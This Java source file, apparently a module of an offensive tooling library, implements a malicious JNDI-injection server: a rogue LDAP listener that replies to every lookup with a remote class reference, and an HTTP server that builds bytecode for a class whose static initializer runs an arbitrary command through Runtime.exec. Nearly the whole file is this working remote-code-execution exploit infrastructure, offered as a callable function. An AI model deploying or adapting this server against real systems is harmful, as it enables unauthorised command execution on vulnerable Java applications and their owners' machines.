package org.hac.lib;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.hac.exception.HacException;
import org.hac.function.NativeFunction;
import org.hac.util.StringUtil;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import static org.objectweb.asm.Opcodes.*;


public class LdapLib {
    private static final String LIB_NAME = "ldap";
    public static List<NativeFunction> lib = new ArrayList<>();
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static int PORT = 1389;
    private static int HTTP_PORT = 8000;
    private static String CMD;

    static {
        try {
            Method startServer = LdapLib.class.getMethod("startServer", int.class, int.class, String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "startServer", startServer));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static int startServer(int port, int httpPort, String cmd) {
        if (StringUtil.isEmpty(cmd)) {
            throw new HacException("empty command");
        }
        CMD = cmd;
        if (port > 0 && port < 65536) {
            PORT = port;
        }
        if (httpPort > 0 && httpPort < 65536) {
            HTTP_PORT = httpPort;
        }
        new Thread(CodeBaseServer::startHttpServer).start();
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new LdapServer());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.startListening();
            System.out.println("start ldap server success!");
            return 1;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return 0;
    }

    static class LdapServer extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            try {
                String output = "Accept " + result.getConnectedAddress() + " -----> " + base;
                System.out.println(output);
                this.sendResult(result, base);
            } catch (Exception ignored) {
            }
        }

        public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
            URL codeBase = new URL("http://0.0.0.0:" + HTTP_PORT + "/#cmd");
            Entry e = new Entry(base);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaClassName", "cmd");
            e.addAttribute("javaFactory", codeBase.getRef());
            e.addAttribute("javaCodeBase", codeBase.toString());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    static class CodeBaseServer {
        public static void startHttpServer() {
            try {
                com.sun.net.httpserver.HttpServer server =
                        com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);
                server.createContext("/cmd.class",
                        new CommandHandler(CMD, "cmd"));
                server.start();
                System.out.println("start http server success!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    static class CommandHandler implements HttpHandler {
        private final String cmd;
        private final String className;

        public CommandHandler(String cmd, String className) {
            this.cmd = cmd;
            this.className = className;
        }

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
            MethodVisitor methodVisitor;
            classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, className, null,
                    "java/lang/Object", null);
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V",
                    null, null);
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>",
                    "()V", false);
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
            methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>", "()V",
                    null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
            methodVisitor.visitLabel(label0);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                    "()Ljava/lang/Runtime;", false);
            methodVisitor.visitLdcInsn(cmd);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                    "(Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitLabel(label1);
            Label label3 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label3);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitVarInsn(ASTORE, 0);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Exception",
                    "printStackTrace", "()V", false);
            methodVisitor.visitLabel(label3);
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitMaxs(2, 1);
            methodVisitor.visitEnd();
            classWriter.visitEnd();
            byte[] data = classWriter.toByteArray();
            exchange.sendResponseHeaders(200, 0);
            OutputStream os = exchange.getResponseBody();
            os.write(data);
            os.close();
        }
    }
}
